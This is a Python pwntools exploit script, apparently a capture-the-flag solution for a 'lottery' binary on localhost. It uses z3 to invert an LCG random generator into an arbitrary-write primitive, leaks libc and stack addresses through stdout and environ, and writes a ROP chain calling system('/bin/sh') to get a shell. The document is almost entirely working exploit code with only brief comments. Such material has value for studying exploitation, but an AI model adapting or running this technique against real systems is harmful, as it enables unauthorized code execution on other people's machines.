from pwn import*
from z3 import*

def wish(idx, content):
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b':')
    p.sendline(str(idx).encode())
    p.recvuntil(b':')
    p.send(content)

def draw(comment):
    p.recvuntil(b'>')
    p.sendline(b'2')
    p.recvuntil(b' : ')
    p.send(comment)

def getLucky():
    p.recvuntil(b'>')
    p.sendline(b'3')
    p.recvuntil(b'is ')
    return int(p.recvline()[:-1])

def getNext(cur):
    return ((cur * 1103515245) + 12345) & 0x7fffffff

def aaw(offset, val, neg = True):
    if neg:
        offset = negate(offset, width = 64)
    nextRand = getNext(getLucky())
    wish(0, p64(nextRand))
    draw(b'A' * 8 + p64(offset))
    wish(0, p64(val).replace(b'\x00', b'\x0a'))

#If set pr, z3 ignores result at pr-1 times.
def leak(pr = 1):
    num = getLucky()
    s = Solver()
    x = BitVec('x', 64)
    s.add(((x * 1103515245) + 12345) & 0x7fffffff == num)
    s.check()
    result = s.model().eval(x).as_long()
    pr -= 1
    while pr > 0:
        s.add(x != result)
        s.check()
        result = s.model().eval(x).as_long()
        pr -= 1
    return result

p = remote('localhost', 15353)
sleep(1)
while True:
    line = p.recvline()
    if b'libc.so.6' in line:
        libc_start = int(line[:-1].split(b'-')[0], 16)
        break
while True:
    line = p.recvline()
    if b'ld-linux-x86-64.so.2' in line:
        p.recvline()
        p.recvline()
        line = p.recvline()
        mem_start = int(line[:-1].split(b'-')[0], 16)
        break
p.close()
#p = process('./lottery')
while True:
    try:
        unsafe_state = 0x21a860
        p = remote('localhost', 15252)
        #Step 1. libc leak
        #set buf->state to stdout
        stdout_addr = 0x404020
        aaw(((mem_start - (libc_start + unsafe_state + 0x10))// 8), stdout_addr)
        #reverse stdout lower 4-bytes
        stdout = leak()
        #set buf->state to stdout + 4
        aaw(((mem_start - (libc_start + unsafe_state + 0x10))// 8), stdout_addr + 4)
        #reverse stdout higher 2-bytes
        stdout += leak() << 32
        #debugging
        log.info('stdout : ' + hex(stdout))
        libc_elf = ELF('./libc-2.35.so')
        libc = stdout - libc_elf.symbols['_IO_2_1_stdout_']
        system = libc + libc_elf.symbols['system']
        binsh = libc + 0x1d8678
        pop_rdi = libc + 0x1bbea1
        add_rsp = libc + 0x1127a7
        ret = libc + 0x1b4b28
        exit = libc + libc_elf.symbols['exit']
        mem = libc + (mem_start - libc_start)
        environ = libc + libc_elf.symbols['environ']
        log.info('environ : ' + hex(environ))
        log.info('libc : ' + hex(libc))
        log.info('mem : ' + hex(mem))
        #Step 2. environ leak
        #because enviroion pointer ends with NULL, we leak environ + 1 address.
        aaw((mem_start - (libc_start + unsafe_state + 0x10))// 8, environ + 1)
        #stack address is almost lacted at the high address. If reverse z3 at one time, it returns lower address.
        stack = leak(pr = 2) << 8
        stack += 0x7f0000000000
        #get inveron lowest byte
        aaw((mem_start - (libc_start + unsafe_state + 0x10))// 8, environ)
        stack += leak() & 0xFF
        org_environ = stack
        stack -= 0x140
        log.info('stack : ' + hex(stack))
        #restore environ
        aaw((mem_start - (libc_start + unsafe_state + 0x10)) // 8, mem + 0x110)
        aaw((mem - environ + 1) // 8, org_environ >> 8)
        aaw((mem - environ) // 8, org_environ)
        # add rsp, 0x28; | ret(for stack align) | ... | pop rdi; ret; | /bin/sh address | system
        aaw((stack - mem + 0x30) // 8, ret, neg = False)
        aaw((stack - mem + 0x38) // 8, pop_rdi, neg = False)
        aaw((stack - mem + 0x40) // 8, binsh, neg = False)
        aaw((stack - mem + 0x48) // 8, system, neg = False)
        aaw((stack - mem) // 8, add_rsp, neg = False)
        p.interactive()
        exit(0)
    except:
        p.close()
